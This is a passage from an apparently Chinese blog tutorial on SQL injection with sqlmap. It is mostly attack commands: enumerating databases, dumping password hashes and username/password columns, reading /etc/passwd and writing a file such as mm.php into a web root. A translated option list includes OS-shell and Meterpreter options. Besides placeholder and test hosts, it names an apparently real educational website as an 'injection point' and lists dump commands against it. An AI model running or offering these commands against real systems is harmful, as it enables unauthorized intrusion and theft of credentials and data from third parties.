(‘abc’&#x3D;&#39;abc”</span><br><span class="line"></span><br><span class="line">16.</span><br><span class="line"></span><br><span class="line">.&#x2F;sqlmap.py -u “http:&#x2F;&#x2F;www.evil0x.com&#x2F; sqlmap&#x2F;mysql&#x2F;basic&#x2F;get_int.php?id&#x3D;1″ –auth-type Basic –auth-cred “testuser:testpass”</span><br><span class="line"></span><br><span class="line">17.</span><br><span class="line"></span><br><span class="line">.&#x2F;sqlmap.py -l burp.log –scope&#x3D;”(www)?\.target\.(com|net|org)”</span><br><span class="line"></span><br><span class="line">18.</span><br><span class="line"></span><br><span class="line">.&#x2F;sqlmap.py -u “http:&#x2F;&#x2F;www.evil0x.com&#x2F; sqlmap&#x2F;mysql&#x2F;get_int.php?id&#x3D;1″ –tamper tamper&#x2F;between.py,tamper&#x2F;randomcase.py,tamper&#x2F;space2comment.py -v 3</span><br><span class="line"></span><br><span class="line">19.</span><br><span class="line"></span><br><span class="line">.&#x2F;sqlmap.py -u “http:&#x2F;&#x2F;www.evil0x.com&#x2F; sqlmap&#x2F;mssql&#x2F;get_int.php?id&#x3D;1″ –sql-query “SELECT ‘foo’” -v 1</span><br><span class="line"></span><br><span class="line">20.</span><br><span class="line"></span><br><span class="line">.&#x2F;sqlmap.py -u “http:&#x2F;&#x2F;www.evil0x.com&#x2F; mysql&#x2F;get_int_4.php?id&#x3D;1″ –common-tables -D testdb –banner</span><br></pre></td></tr></table></figure>

<p>简单的注入流程</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">1.读取数据库版本，当前用户，当前数据库</span><br><span class="line">sqlmap -u http:&#x2F;&#x2F;www.evil0x.com&#x2F; test.php?p&#x3D;2 -f -b –current-user –current-db -v 1</span><br><span class="line"></span><br><span class="line">2.判断当前数据库用户权限</span><br><span class="line">sqlmap -u http:&#x2F;&#x2F;www.evil0x.com&#x2F; test.php?p&#x3D;2 –privileges -U 用户名 -v 1</span><br><span class="line"></span><br><span class="line">sqlmap -u http:&#x2F;&#x2F;www.evil0x.com&#x2F; test.php?p&#x3D;2 –is-dba -U 用户名 -v 1</span><br><span class="line"></span><br><span class="line">3.读取所有数据库用户或指定数据库用户的密码</span><br><span class="line">sqlmap -u http:&#x2F;&#x2F;www.evil0x.com&#x2F; test.php?p&#x3D;2 –users –passwords -v 2</span><br><span class="line"></span><br><span class="line">sqlmap -u http:&#x2F;&#x2F;www.evil0x.com&#x2F; test.php?p&#x3D;2 –passwords -U root -v 2</span><br><span class="line"></span><br><span class="line">4.获取所有数据库</span><br><span class="line">sqlmap -u http:&#x2F;&#x2F;www.evil0x.com&#x2F; test.php?p&#x3D;2 –dbs -v 2</span><br><span class="line"></span><br><span class="line">5.获取指定数据库中的所有表</span><br><span class="line">sqlmap -u http:&#x2F;&#x2F;www.evil0x.com&#x2F; test.php?p&#x3D;2 –tables -D mysql -v 2</span><br><span class="line"></span><br><span class="line">6.获取指定数据库名中指定表的字段</span><br><span class="line">sqlmap -u http:&#x2F;&#x2F;www.evil0x.com&#x2F; test.php?p&#x3D;2 –columns -D mysql -T users -v 2</span><br><span class="line"></span><br><span class="line">7.获取指定数据库名中指定表中指定字段的数据</span><br><span class="line">sqlmap -u http:&#x2F;&#x2F;www.evil0x.com&#x2F; test.php?p&#x3D;2 –dump -D mysql -T users -C “username,password” -s “sqlnmapdb.log” -v 2</span><br><span class="line"></span><br><span class="line">8.file-read读取web文件</span><br><span class="line">sqlmap -u http:&#x2F;&#x2F;www.evil0x.com&#x2F; test.php?p&#x3D;2 –file-read “&#x2F;etc&#x2F;passwd” -v 2</span><br><span class="line"></span><br><span class="line">9.file-write写入文件到web</span><br><span class="line">sqlmap -u http:&#x2F;&#x2F;www.evil0x.com&#x2F; test.php?p&#x3D;2 –file-write &#x2F;localhost&#x2F;mm.php –file-dest</span><br><span class="line"></span><br><span class="line">.&#x2F;sqlmap.py -u &quot;http:&#x2F;&#x2F;www.nxadmin.com&#x2F;sql-injection.php?id&#x3D;1&quot; –file-write &#x2F;test&#x2F;test.txt –file-dest &#x2F;var&#x2F;www&#x2F;html&#x2F;1.txt</span><br><span class="line"></span><br><span class="line">将本地的test.txt写入到站点服务器的html目录下。</span><br></pre></td></tr></table></figure>

<p>python sqlmap/sqlmap.py -help</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br></pre></td><td class="code"><pre><span class="line">Options（选项）：</span><br><span class="line"></span><br><span class="line">--version 显示程序的版本号并退出</span><br><span class="line"></span><br><span class="line">-h, --help 显示此帮助消息并退出</span><br><span class="line"></span><br><span class="line">-v VERBOSE 详细级别：0-6（默认为1）</span><br><span class="line"></span><br><span class="line">Target（目标）：</span><br><span class="line"></span><br><span class="line">以下至少需要设置其中一个选项，设置目标URL。</span><br><span class="line"></span><br><span class="line">-d DIRECT 直接连接到数据库。</span><br><span class="line"></span><br><span class="line">-u URL, --url&#x3D;URL 目标URL。</span><br><span class="line"></span><br><span class="line">-l LIST 从Burp或WebScarab代理的日志中解析目标。</span><br><span class="line"></span><br><span class="line">-r REQUESTFILE 从一个文件中载入HTTP请求。</span><br><span class="line"></span><br><span class="line">-g GOOGLEDORK 处理Google dork的结果作为目标URL。</span><br><span class="line"></span><br><span class="line">-c CONFIGFILE 从INI配置文件中加载选项。</span><br><span class="line"></span><br><span class="line">Request（请求）：</span><br><span class="line"></span><br><span class="line">这些选项可以用来指定如何连接到目标URL。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">--data&#x3D;DATA 通过POST发送的数据字符串</span><br><span class="line"></span><br><span class="line">--cookie&#x3D;COOKIE HTTP Cookie头</span><br><span class="line"></span><br><span class="line">--cookie-urlencode URL 编码生成的cookie注入</span><br><span class="line"></span><br><span class="line">--drop-set-cookie 忽略响应的Set - Cookie头信息</span><br><span class="line"></span><br><span class="line">--user-agent&#x3D;AGENT 指定 HTTP User - Agent头</span><br><span class="line"></span><br><span class="line">--random-agent 使用随机选定的HTTP User - Agent头</span><br><span class="line"></span><br><span class="line">--referer&#x3D;REFERER 指定 HTTP Referer头</span><br><span class="line"></span><br><span class="line">--headers&#x3D;HEADERS 换行分开，加入其他的HTTP头</span><br><span class="line"></span><br><span class="line">--auth-type&#x3D;ATYPE HTTP身份验证类型（基本，摘要或NTLM）(Basic, Digest or NTLM)</span><br><span class="line"></span><br><span class="line">--auth-cred&#x3D;ACRED HTTP身份验证凭据（用户名:密码）</span><br><span class="line"></span><br><span class="line">--auth-cert&#x3D;ACERT HTTP认证证书（key_file，cert_file）</span><br><span class="line"></span><br><span class="line">--proxy&#x3D;PROXY 使用HTTP代理连接到目标URL</span><br><span class="line"></span><br><span class="line">--proxy-cred&#x3D;PCRED HTTP代理身份验证凭据（用户名：密码）</span><br><span class="line"></span><br><span class="line">--ignore-proxy 忽略系统默认的HTTP代理</span><br><span class="line"></span><br><span class="line">--delay&#x3D;DELAY 在每个HTTP请求之间的延迟时间，单位为秒</span><br><span class="line"></span><br><span class="line">--timeout&#x3D;TIMEOUT 等待连接超时的时间（默认为30秒）</span><br><span class="line"></span><br><span class="line">--retries&#x3D;RETRIES 连接超时后重新连接的时间（默认3）</span><br><span class="line"></span><br><span class="line">--scope&#x3D;SCOPE 从所提供的代理日志中过滤器目标的正则表达式</span><br><span class="line"></span><br><span class="line">--safe-url&#x3D;SAFURL 在测试过程中经常访问的url地址</span><br><span class="line"></span><br><span class="line">--safe-freq&#x3D;SAFREQ 两次访问之间测试请求，给出安全的URL</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Optimization（优化）：</span><br><span class="line"></span><br><span class="line">这些选项可用于优化SqlMap的性能。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-o 开启所有优化开关</span><br><span class="line"></span><br><span class="line">--predict-output 预测常见的查询输出</span><br><span class="line"></span><br><span class="line">--keep-alive 使用持久的HTTP（S）连接</span><br><span class="line"></span><br><span class="line">--null-connection 从没有实际的HTTP响应体中检索页面长度</span><br><span class="line"></span><br><span class="line">--threads&#x3D;THREADS 最大的HTTP（S）请求并发量（默认为1）</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Injection（注入）：</span><br><span class="line"></span><br><span class="line">这些选项可以用来指定测试哪些参数， 提供自定义的注入payloads和可选篡改脚本。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-p TESTPARAMETER 可测试的参数（S）</span><br><span class="line"></span><br><span class="line">--dbms&#x3D;DBMS 强制后端的DBMS为此值</span><br><span class="line"></span><br><span class="line">--os&#x3D;OS 强制后端的DBMS操作系统为这个值</span><br><span class="line"></span><br><span class="line">--prefix&#x3D;PREFIX 注入payload字符串前缀</span><br><span class="line"></span><br><span class="line">--suffix&#x3D;SUFFIX 注入payload字符串后缀</span><br><span class="line"></span><br><span class="line">--tamper&#x3D;TAMPER 使用给定的脚本（S）篡改注入数据</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Detection（检测）：</span><br><span class="line"></span><br><span class="line">这些选项可以用来指定在SQL盲注时如何解析和比较HTTP响应页面的内容。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">--level&#x3D;LEVEL 执行测试的等级（1-5，默认为1）</span><br><span class="line"></span><br><span class="line">--risk&#x3D;RISK 执行测试的风险（0-3，默认为1）</span><br><span class="line"></span><br><span class="line">--string&#x3D;STRING 查询时有效时在页面匹配字符串</span><br><span class="line"></span><br><span class="line">--regexp&#x3D;REGEXP 查询时有效时在页面匹配正则表达式</span><br><span class="line"></span><br><span class="line">--text-only 仅基于在文本内容比较网页</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Techniques（技巧）：</span><br><span class="line"></span><br><span class="line">这些选项可用于调整具体的SQL注入测试。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">--technique&#x3D;TECH SQL注入技术测试（默认BEUST）</span><br><span class="line"></span><br><span class="line">--time-sec&#x3D;TIMESEC DBMS响应的延迟时间（默认为5秒）</span><br><span class="line"></span><br><span class="line">--union-cols&#x3D;UCOLS 定列范围用于测试UNION查询注入</span><br><span class="line"></span><br><span class="line">--union-char&#x3D;UCHAR 用于暴力猜解列数的字符</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Fingerprint（指纹）：</span><br><span class="line"></span><br><span class="line">-f, --fingerprint 执行检查广泛的DBMS版本指纹</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Enumeration（枚举）：</span><br><span class="line"></span><br><span class="line">这些选项可以用来列举后端数据库管理系统的信息、表中的结构和数据。此外，您还可以运行您自己</span><br><span class="line"></span><br><span class="line">的SQL语句。</span><br><span class="line"></span><br><span class="line">-b, --banner 检索数据库管理系统的标识</span><br><span class="line"></span><br><span class="line">--current-user 检索数据库管理系统当前用户</span><br><span class="line"></span><br><span class="line">--current-db 检索数据库管理系统当前数据库</span><br><span class="line"></span><br><span class="line">--is-dba 检测DBMS当前用户是否DBA</span><br><span class="line"></span><br><span class="line">--users 枚举数据库管理系统用户</span><br><span class="line"></span><br><span class="line">--passwords 枚举数据库管理系统用户密码哈希</span><br><span class="line"></span><br><span class="line">--privileges 枚举数据库管理系统用户的权限</span><br><span class="line"></span><br><span class="line">--roles 枚举数据库管理系统用户的角色</span><br><span class="line"></span><br><span class="line">--dbs 枚举数据库管理系统数据库</span><br><span class="line"></span><br><span class="line">--tables 枚举的DBMS数据库中的表</span><br><span class="line"></span><br><span class="line">--columns 枚举DBMS数据库表列</span><br><span class="line"></span><br><span class="line">--dump 转储数据库管理系统的数据库中的表项</span><br><span class="line"></span><br><span class="line">--dump-all 转储所有的DBMS数据库表中的条目</span><br><span class="line"></span><br><span class="line">--search 搜索列（S），表（S）和&#x2F;或数据库名称（S）</span><br><span class="line"></span><br><span class="line">-D DB 要进行枚举的数据库名</span><br><span class="line"></span><br><span class="line">-T TBL 要进行枚举的数据库表</span><br><span class="line"></span><br><span class="line">-C COL 要进行枚举的数据库列</span><br><span class="line"></span><br><span class="line">-U USER 用来进行枚举的数据库用户</span><br><span class="line"></span><br><span class="line">--exclude-sysdbs 枚举表时排除系统数据库</span><br><span class="line"></span><br><span class="line">--start&#x3D;LIMITSTART 第一个查询输出进入检索</span><br><span class="line"></span><br><span class="line">--stop&#x3D;LIMITSTOP 最后查询的输出进入检索</span><br><span class="line"></span><br><span class="line">--first&#x3D;FIRSTCHAR 第一个查询输出字的字符检索</span><br><span class="line"></span><br><span class="line">--last&#x3D;LASTCHAR 最后查询的输出字字符检索</span><br><span class="line"></span><br><span class="line">--sql-query&#x3D;QUERY 要执行的SQL语句</span><br><span class="line"></span><br><span class="line">--sql-shell 提示交互式SQL的shell</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Brute force（蛮力）：</span><br><span class="line"></span><br><span class="line">这些选项可以被用来运行蛮力检查。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">--common-tables 检查存在共同表</span><br><span class="line"></span><br><span class="line">--common-columns 检查存在共同列</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">User-defined function injection（用户自定义函数注入）：</span><br><span class="line"></span><br><span class="line">这些选项可以用来创建用户自定义函数。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">--udf-inject 注入用户自定义函数</span><br><span class="line"></span><br><span class="line">--shared-lib&#x3D;SHLIB 共享库的本地路径</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">File system access（访问文件系统）：</span><br><span class="line"></span><br><span class="line">这些选项可以被用来访问后端数据库管理系统的底层文件系统。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">--file-read&#x3D;RFILE 从后端的数据库管理系统文件系统读取文件</span><br><span class="line"></span><br><span class="line">--file-write&#x3D;WFILE 编辑后端的数据库管理系统文件系统上的本地文件</span><br><span class="line"></span><br><span class="line">--file-dest&#x3D;DFILE 后端的数据库管理系统写入文件的绝对路径</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Operating system access（操作系统访问）：</span><br><span class="line"></span><br><span class="line">这些选项可以用于访问后端数据库管理系统的底层操作系统。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">--os-cmd&#x3D;OSCMD 执行操作系统命令</span><br><span class="line"></span><br><span class="line">--os-shell 交互式的操作系统的shell</span><br><span class="line"></span><br><span class="line">--os-pwn 获取一个OOB shell，meterpreter或VNC</span><br><span class="line"></span><br><span class="line">--os-smbrelay 一键获取一个OOB shell，meterpreter或VNC</span><br><span class="line"></span><br><span class="line">--os-bof 存储过程缓冲区溢出利用</span><br><span class="line"></span><br><span class="line">--priv-esc 数据库进程用户权限提升</span><br><span class="line"></span><br><span class="line">--msf-path&#x3D;MSFPATH Metasploit Framework本地的安装路径</span><br><span class="line"></span><br><span class="line">--tmp-path&#x3D;TMPPATH 远程临时文件目录的绝对路径</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Windows注册表访问：</span><br><span class="line"></span><br><span class="line">这些选项可以被用来访问后端数据库管理系统Windows注册表。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">--reg-read 读一个Windows注册表项值</span><br><span class="line"></span><br><span class="line">--reg-add 写一个Windows注册表项值数据</span><br><span class="line"></span><br><span class="line">--reg-del 删除Windows注册表键值</span><br><span class="line"></span><br><span class="line">--reg-key&#x3D;REGKEY Windows注册表键</span><br><span class="line"></span><br><span class="line">--reg-value&#x3D;REGVAL Windows注册表项值</span><br><span class="line"></span><br><span class="line">--reg-data&#x3D;REGDATA Windows注册表键值数据</span><br><span class="line"></span><br><span class="line">--reg-type&#x3D;REGTYPE Windows注册表项值类型</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">General（一般）：</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">这些选项可以用来设置一些一般的工作参数。</span><br><span class="line"></span><br><span class="line">-t TRAFFICFILE 记录所有HTTP流量到一个文本文件中</span><br><span class="line"></span><br><span class="line">-s SESSIONFILE 保存和恢复检索会话文件的所有数据</span><br><span class="line"></span><br><span class="line">--flush-session 刷新当前目标的会话文件</span><br><span class="line"></span><br><span class="line">--fresh-queries 忽略在会话文件中存储的查询结果</span><br><span class="line"></span><br><span class="line">--eta 显示每个输出的预计到达时间</span><br><span class="line"></span><br><span class="line">--update 更新SqlMap</span><br><span class="line"></span><br><span class="line">--save file保存选项到INI配置文件</span><br><span class="line"></span><br><span class="line">--batch 从不询问用户输入，使用所有默认配置。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Miscellaneous（杂项）：</span><br><span class="line"></span><br><span class="line">--beep 发现SQL注入时提醒</span><br><span class="line"></span><br><span class="line">--check-payload IDS对注入payloads的检测测试</span><br><span class="line"></span><br><span class="line">--cleanup SqlMap具体的UDF和表清理DBMS</span><br><span class="line"></span><br><span class="line">--forms 对目标URL的解析和测试形式</span><br><span class="line"></span><br><span class="line">--gpage&#x3D;GOOGLEPAGE 从指定的页码使用谷歌dork结果</span><br><span class="line"></span><br><span class="line">--page-rank Google dork结果显示网页排名（PR）</span><br><span class="line"></span><br><span class="line">--parse-errors 从响应页面解析数据库管理系统的错误消息</span><br><span class="line"></span><br><span class="line">--replicate 复制转储的数据到一个sqlite3数据库</span><br><span class="line"></span><br><span class="line">--tor 使用默认的Tor（Vidalia&#x2F; Privoxy&#x2F; Polipo）代理地址</span><br><span class="line"></span><br><span class="line">--wizard 给初级用户的简单向导界面</span><br></pre></td></tr></table></figure>

<p>注入点：<a target="_blank" rel="noopener" href="https://links.jianshu.com/go?to=http://testasp.vulnweb.com/Login.asp">http://testasp.vulnweb.com/Login.asp</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">几种注入方式：.&#x2F;sqlmap.py -r search-test.txt -p tfUPass</span><br><span class="line"></span><br><span class="line">sqlmap -u http:&#x2F;&#x2F;testasp.vulnweb.com&#x2F;Login.asp --forms</span><br><span class="line"></span><br><span class="line">sqlmap.py -u http:&#x2F;&#x2F;testasp.vulnweb.com&#x2F;Login.asp --data &quot;tfUName&#x3D;1&amp;tfUPass&#x3D;1&quot;</span><br></pre></td></tr></table></figure>

<p>注入点：<a target="_blank" rel="noopener" href="https://links.jianshu.com/go?to=http://jxjy.bfa.edu.cn/bm/newslist.php?cid=7">http://jxjy.bfa.edu.cn/bm/newslist.php?cid=7</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">获取所有数据库名称</span><br><span class="line">sqlmap.py -u http:&#x2F;&#x2F;jxjy.bfa.edu.cn&#x2F;bm&#x2F;newslist.php?cid&#x3D;7 --dbs</span><br><span class="line"></span><br><span class="line">获取当前数据库名称</span><br><span class="line">sqlmap.py -u http:&#x2F;&#x2F;jxjy.bfa.edu.cn&#x2F;bm&#x2F;newslist.php?cid&#x3D;7 --current-db</span><br><span class="line"></span><br><span class="line">获取当前用户名称</span><br><span class="line">sqlmap.py -u http:&#x2F;&#x2F;jxjy.bfa.edu.cn&#x2F;bm&#x2F;newslist.php?cid&#x3D;7 --current-user</span><br><span class="line">获取全部表段</span><br><span class="line">sqlmap.py -u http:&#x2F;&#x2F;jxjy.bfa.edu.cn&#x2F;bm&#x2F;newslist.php?cid&#x3D;7 --tables -D 数据库名称</span><br><span class="line">获取全部字段</span><br><span class="line">sqlmap.py -u http:&#x2F;&#x2F;jxjy.bfa.edu.cn&#x2F;bm&#x2F;newslist.php?cid&#x3D;7 --columns -T 表段 -D 数据库名称</span><br><span class="line">获取字段内容</span><br><span class="line">sqlmap.py -u http:&#x2F;&#x2F;jxjy.bfa.edu.cn&#x2F;bm&#x2F;newslist.php?cid&#x3D;7 --dump -C username,password -T 表段 -D 数据库名称</span><br><span class="line"></span><br><span class="line">1)判断当前用户是否是dba</span><br><span class="line"></span><br><span class="line">sqlmap.py -u 